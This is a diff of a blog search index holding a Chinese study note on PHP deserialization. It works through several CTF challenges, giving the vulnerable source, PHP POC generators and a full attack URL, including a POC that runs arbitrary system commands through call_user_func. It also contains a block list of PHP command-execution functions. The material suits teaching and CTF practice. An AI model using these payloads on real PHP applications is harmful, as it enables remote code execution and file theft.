在不可访问的属性上使用unset()时触发</span><br><span class="line"></span><br><span class="line">__toString() 把类当作字符串使用时触发</span><br><span class="line"></span><br><span class="line">__invoke() 当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
-<h1 id="POC链"><a href="#POC链" class="headerlink" title="POC链"></a>POC链</h1><p>是一串专门的序列化字符串，传到php网页后解序列化，就能激活php网页中<em>特定对象</em>的魔术方法，从而执行敏感函数，例如读取flag、执行命令或代码</p>
-<p>POC链的结构需要与特定对象一样，即有相同的类名、成员变量名，且包含类所规定的所有成员变量</p>
-<p>POC链的构造需要对php网页代码进行审计，分析类的结构、魔术方法和成员变量间的关系，最终用本地的php脚本生成序列化字符串</p>
-<h2 id="POC链的工作原理"><a href="#POC链的工作原理" class="headerlink" title="POC链的工作原理"></a>POC链的工作原理</h2><ol>
-<li>作为网页的穿参传到php网页</li>
-<li>php网页自动反序列化poc链条(前提是网页确实会反序列化该穿参)</li>
-<li>poc链条符合了魔术方法的发动条件，从而引发了一连串的魔术方法反应，最终执行敏感函数</li>
-</ol>
-<blockquote>
-<p>一般读取文件、执行命令的函数都是敏感函数</p>
-</blockquote>
-<h2 id="生成poc链"><a href="#生成poc链" class="headerlink" title="生成poc链"></a>生成poc链</h2><ol>
-<li>编写php代码，定义类——和目标网页源代码中的类结构要一模一样，严格到大小写也一样</li>
-<li>创建对象，更改对象的成员变量的值，以达到引动魔术方法的目的</li>
-<li>生成序列化字符串</li>
-</ol>
-<h1 id="反序列化例题"><a href="#反序列化例题" class="headerlink" title="反序列化例题"></a>反序列化例题</h1><p>ctfhub上有环境，可以自己做</p>
-<h2 id="2020-网鼎杯-朱雀组-Web-phpweb"><a href="#2020-网鼎杯-朱雀组-Web-phpweb" class="headerlink" title="2020-网鼎杯-朱雀组-Web-phpweb"></a>2020-网鼎杯-朱雀组-Web-phpweb</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
-<p>最简单的，但是有一些弯弯绕绕</p>
-<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ol>
-<li>页面接受两个POST传参：func p</li>
-<li>call_user_func($func, $p)是敏感函数，其第一个参数是php函数名，第二个参数是函数的传参，其功能就是调用并执行函数</li>
-<li>这确实可以执行函数，但是经过了严格的过滤，当然，file_get_contents和unserialize函数是可以使用的</li>
-<li>原题通过file_get_contents阅读代码</li>
-<li>改网页对func进行了过滤，但是没有对p，同时有一个调用了敏感函数入口gettime的Test类，所以可以手动执行unserialize函数，并构造poc链</li>
-</ol>
-<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">	var p;</span><br><span class="line">	var func; //由于序列化后的对象没有了方法，所以那些多余的东西根本不用写根本不用写</span><br><span class="line">&#125;</span><br><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;p = &quot;pwd&quot;;</span><br><span class="line">$a-&gt;func = &quot;system&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">//echo urlencode(serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>然后传参，func为unserialize，p为poc链，现在可以执行任意系统命令和代码了</p>
-<h2 id="2020-网鼎杯-青龙组-Web-AreUSerialz"><a href="#2020-网鼎杯-青龙组-Web-AreUSerialz" class="headerlink" title="2020-网鼎杯-青龙组-Web-AreUSerialz"></a>2020-网鼎杯-青龙组-Web-AreUSerialz</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"> </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line">class FileHandler &#123;</span><br><span class="line"> </span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"> </span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"> </span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h2><ol>
-<li>接受一个传参str，进行is_valid过滤(这个过滤的意思就只是确保str里没有32-125之外的字符，鉴于我们传的东西没有那些字符，所以可以直接略过)</li>
-<li>反序列化<code>$</code>str，并赋值给<code>$</code>obj</li>
-<li>类FileHandler有三个成员变量，在序列化里，protected没多大用的</li>
-<li>FileHandler在创建对象的时候会执行<code>__construct</code>，销毁对象时执行<code>__destruct</code>，两个方法都会调用process方法</li>
-<li>process方法会调用write或read方法，这两个方法里有敏感函数，一个读文件一个写文件，我们这次只需要读；然后会调用output将read的返回输出</li>
-<li>如果要构造poc链，那里面的op要为2，filename要为我们想要读取文件的文件名，当然就是include包含的flag.php</li>
-</ol>
-<h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public $op;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler(); // 虽然__construct方法会修改op和filename</span><br><span class="line">$a-&gt;op=2;</span><br><span class="line">$a-&gt;filename=&quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">//echo urlencode(serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"><a href="#浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维" class="headerlink" title="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"></a>浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维</h2><h2 id="源码1"><a href="#源码1" class="headerlink" title="源码1"></a>源码1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这里用到了伪协议的知识，这与我们这篇浅记的主题无关，况且这是浅浅一记<br>只需要知道，通过data:&#x2F;&#x2F;伪协议传text绕过welcome to the zjctf，再file传php伪协议的任意文件读取读useless.php内容的base64，然后解码就能得到useless.php源代码</p>
-<h2 id="源码2"><a href="#源码2" class="headerlink" title="源码2"></a>源码2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
-<p>这里可以真读取任意文件了，毕竟源码1过滤了file</p>
-<h2 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h2><ol>
-<li><code>__tostring</code>在所在对象被当作字符串时发动</li>
-<li>敏感函数读取$file文件，然后输出</li>
-<li>由于源码1 echo了反序列化的$password——当作字符串输出，所以这里就是突破口</li>
-</ol>
-<h2 id="poc链"><a href="#poc链" class="headerlink" title="poc链"></a>poc链</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;  </span><br><span class="line">    public $file;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;file=&quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">//echo urlencode(serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>传入一下url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>ps:我想时常试用f12是一个好习惯</p>
-<h2 id="2021-第五空间智能安全大赛-Web-pklovecloud"><a href="#2021-第五空间智能安全大赛-Web-pklovecloud" class="headerlink" title="2021-第五空间智能安全大赛-Web-pklovecloud"></a>2021-第五空间智能安全大赛-Web-pklovecloud</h2><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">class pkshow </span><br><span class="line">&#123;  </span><br><span class="line">    function echo_name()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;Pk very safe^.^&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;cinder))  </span><br><span class="line">            return $this-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">    function echo_name()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;openstack = unserialize($this-&gt;docker);</span><br><span class="line">        $this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;</span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;keystone lost~&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pks&#x27;]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[&#x27;pks&#x27;]);</span><br><span class="line">    echo $logData; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h2><ol>
-<li>反序列化pks，赋值给logData，然后输出</li>
-<li>pkshow类没什么好说的</li>
-<li>acp会首先将cinder构建为pkshow对象，然后调用里面的echo_name输出，我们不想要这个</li>
-<li>ace的echo_name会反序列化成员变量docker，然后赋值给openstack</li>
-<li>比较openstack里面的neutron和nova，看看是否值和类型都相等</li>
-<li>相等就根据$filename读取文件</li>
-<li>如果openstack没有neutron和nova，那么必然相等，即——虚无和虚无是等价的。毕竟$heat的值是不知道的。这意味着根本不用管docker和openstack</li>
-</ol>
-<h2 id="poc链条"><a href="#poc链条" class="headerlink" title="poc链条"></a>poc链条</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ace&#123;</span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">&#125;</span><br><span class="line">clase acp&#123;</span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new acp();</span><br><span class="line">$a-&gt;cinder=new ace();</span><br><span class="line">$a-&gt;cinder-&gt;filename=&quot;flag.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
-<li>反序列化蛮好玩的，当然学的话那是真的头痛</li>
-<li>解决反序列化题目有一下几个要点<ol>
-<li>得到源代码</li>
-<li>魔术方法</li>
-</ol>
-</li>
-<li>得到源代码需要其他web渗透和ctf技能的辅助，我的基础不太牢靠，需要对一下这几个方面进行补足：<ol>
-<li>xss</li>
-<li>csrf</li>
-<li>ssrf</li>
-<li>伪协议</li>
-<li>文件上传、读取、包含webshell</li>
-<li>SQL注入</li>
-<li>其他</li>
-</ol>
-</li>
-</ol>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>php反序列化浅记</title>
+      <link href="/2023/10/25/old/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E8%AE%B0/"/>
+      <url>/2023/10/25/old/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<p>关键词：对象、类、成员变量、成员函数、父子类、序列化、反序列化、魔术方法、poc</p><p>感谢让我领略了php反序列化风采的K3zy前辈： <a href="https://github.com/kkontheway">https://github.com/kkontheway</a></p><hr><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>面向对象的是一种编程思想和方法<br>即将数据和操作数据的方法封装成一个对象，来实现具体的功能<br>也就是说对象包含了一些数据和一些函数(即方法)，可以调用对象的成员变量来进行计算，也可以调用对象的成员方法达成某一功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对象这个概念十分的抽象，runoob关于对象的介绍十分的好，但是我觉得有多余的抽象，如果要方便理解这个概念，还是具象一点好，尤其是我不搞开发，不向这种东西注入“心血”</span><br><span class="line">我认为要善于灵活地运用抽象和具象来方便学习</span><br></pre></td></tr></table></figure><p>类是创建对象的模版，对象的创建按照类的结构、包含类的方法(函数)</p><h2 id="类的创建"><a href="#类的创建" class="headerlink" title="类的创建"></a>类的创建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class 类名 &#123;</span><br><span class="line">成员变量</span><br><span class="line">function 成员方法(形参)&#123;</span><br><span class="line">方法语句; //函数语句</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$变量 = new 类名(穿参);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="对象成员的调用"><a href="#对象成员的调用" class="headerlink" title="对象成员的调用"></a>对象成员的调用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$对象变量-&gt;成员变量 = 1;</span><br><span class="line">$对象变量-&gt;成员函数();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="关于对象的访问控制"><a href="#关于对象的访问控制" class="headerlink" title="关于对象的访问控制"></a>关于对象的访问控制</h2><p><strong>public（公有）：</strong> 公有的类成员可以在任何地方被访问。&#x2F;&#x2F; 如果用var定义那就算public<br><strong>protected（受保护）：</strong> 受保护的类成员则可以被其自身以及其子类和父类访问。<br><strong>private（私有）：</strong> 私有的类成员则只能被其定义所在的类访问。</p><p>以上关于访问控制的“类”可以和”对象“替换</p><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p>只需要知道两个函数和一个核心特性</p><ul><li><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串，如果对象里有方法，则略过不管</li><li><strong>unserialize()</strong> 函数用于将序列化后的对象或数组进行反序列化，并返回原始的对象结构(不包括方法了)</li><li>核心特性就是，若一个序列化字符串包含了对象a(其结构与类A完全相同)，且发送到了一个php网页被反序列化，同时这个php网页定义了类A，那么这个反序列化后的对象能调用类A的方法了</li></ul><p>对象结构与类结构相同的意思是，对象具有相同的类名和变量名</p><h1 id="浅析序列化字符串"><a href="#浅析序列化字符串" class="headerlink" title="浅析序列化字符串"></a>浅析序列化字符串</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag1&#123; </span><br><span class="line">    public $file;  </span><br><span class="line">public $apple=&quot;red and sweet&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Flag02&#123;</span><br><span class="line">public $test;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Flag1();</span><br><span class="line">$a-&gt;file=new Flag02();</span><br><span class="line">$a-&gt;file-&gt;test=&quot;I&#x27;m truthleader&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该代码打印的序列化字符串如下：<br><code>O:5:&quot;Flag1&quot;:3:&#123;s:4:&quot;file&quot;;O:6:&quot;Flag02&quot;:1:&#123;s:4:&quot;test&quot;;s:15:&quot;I&#39;m truthleader&quot;;&#125;s:5:&quot;apple&quot;;s:13:&quot;red and sweet&quot;;s:6:&quot;banana&quot;;N;&#125;</code><br>这可以拆分为</p><ul><li>O:5:”Flag1”:2:{}</li><li>:4:”file”;O:6:”Flag02”:1:{}s:5:”apple”;s:13:”red and sweet”;s:6:”banana”;N;</li><li>s:4:”test”;s:15:”I’m truthleader”;</li></ul><ol><li>第一段的O代表对象，5代表对象名的字符数，Flag1是对象名，2代表该对象有两个成员变量，{这里嵌套了两个成员变量}</li><li>第二段的s代表字符串(即变量的数据类型)，file是变量名，而Flag02是值名兼对象名。banana的值的类型是N。{这里的成员变量是一键值对的形式排列的}</li><li>第三段同上</li></ol><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>具体内容看php官网<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><p>魔法方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。魔术方法与序列化和反序列化强相关<br>魔术方法的名称是固定的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() 执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__sleep() 执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__destruct() 对象被销毁时触发</span><br><span class="line"></span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line"></span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line"></span><br><span class="line">__get() 用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line"></span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line"></span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line"></span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br><span class="line"></span><br><span class="line">__toString() 把类当作字符串使用时触发</span><br><span class="line"></span><br><span class="line">__invoke() 当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h1 id="POC链"><a href="#POC链" class="headerlink" title="POC链"></a>POC链</h1><p>是一串专门的序列化字符串，传到php网页后解序列化，就能激活php网页中<em>特定对象</em>的魔术方法，从而执行敏感函数，例如读取flag、执行命令或代码</p><p>POC链的结构需要与特定对象一样，即有相同的类名、成员变量名，且包含类所规定的所有成员变量</p><p>POC链的构造需要对php网页代码进行审计，分析类的结构、魔术方法和成员变量间的关系，最终用本地的php脚本生成序列化字符串</p><h2 id="POC链的工作原理"><a href="#POC链的工作原理" class="headerlink" title="POC链的工作原理"></a>POC链的工作原理</h2><ol><li>作为网页的穿参传到php网页</li><li>php网页自动反序列化poc链条(前提是网页确实会反序列化该穿参)</li><li>poc链条符合了魔术方法的发动条件，从而引发了一连串的魔术方法反应，最终执行敏感函数</li></ol><blockquote><p>一般读取文件、执行命令的函数都是敏感函数</p></blockquote><h2 id="生成poc链"><a href="#生成poc链" class="headerlink" title="生成poc链"></a>生成poc链</h2><ol><li>编写php代码，定义类——和目标网页源代码中的类结构要一模一样，严格到大小写也一样</li><li>创建对象，更改对象的成员变量的值，以达到引动魔术方法的目的</li><li>生成序列化字符串</li></ol><h1 id="反序列化例题"><a href="#反序列化例题" class="headerlink" title="反序列化例题"></a>反序列化例题</h1><p>ctfhub上有环境，可以自己做</p><h2 id="2020-网鼎杯-朱雀组-Web-phpweb"><a href="#2020-网鼎杯-朱雀组-Web-phpweb" class="headerlink" title="2020-网鼎杯-朱雀组-Web-phpweb"></a>2020-网鼎杯-朱雀组-Web-phpweb</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 